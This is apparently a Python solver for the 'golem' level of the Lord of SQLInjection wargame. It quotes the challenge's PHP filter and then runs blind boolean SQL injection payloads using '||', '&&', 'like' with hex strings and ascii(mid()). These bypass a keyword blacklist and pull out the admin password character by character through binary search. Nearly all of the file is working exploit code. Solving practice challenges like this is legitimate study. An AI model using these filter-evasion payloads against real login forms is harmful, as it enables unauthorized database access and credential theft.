#!/usr/bin/env python3
import pickle
import los
from getpass import getpass


def check_func(response: str) -> bool:
    return 'Hello admin' in response


def main():
    '''
    Golem

    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
    if(preg_match('/or|and|substr\(|=/i', $_GET[pw])) exit("HeHe"); 
    $query = "select id from prob_golem where id='guest' and pw='{$_GET[pw]}'"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
    if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 

    $_GET[pw] = addslashes($_GET[pw]); 
    $query = "select pw from prob_golem where id='admin' and pw='{$_GET[pw]}'"; 
    $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
    if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("golem"); 
    '''

    url = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php"

    try:
        with open('cooks.pickle', 'rb') as f:
            cook = pickle.load(f)
    except:
        cook = {'PHPSESSID': getpass(
            prompt='enter PHPSESSID cookie: ')}

    if "location.href='../';" in los.get_request(url, {}, cook, print_param=False):
        print('you need to login in browser')
        exit(1)

    payload = "'||length(pw)>%s&&id like 0x61646d696e#"
    param = dict(pw=payload)
    len_of_key = los.find_key_len(url, param, check_func, cook)

    print(len_of_key)

    payload = "'||id like 'admin'&&ascii(mid(pw,%s,1))%s#"
    param = dict(pw=payload)
    result = los.find_binary(url, param, check_func,
                             32, 127, len_of_key, cook)

    print(result)

    param = dict(pw=result)
    response = los.get_request(url, param, cook)

    if 'Clear!' in response:
        print('GOLEM Clear!')

    # Save cookie
    los.save_cookies(cook)


if __name__ == '__main__':
    main()
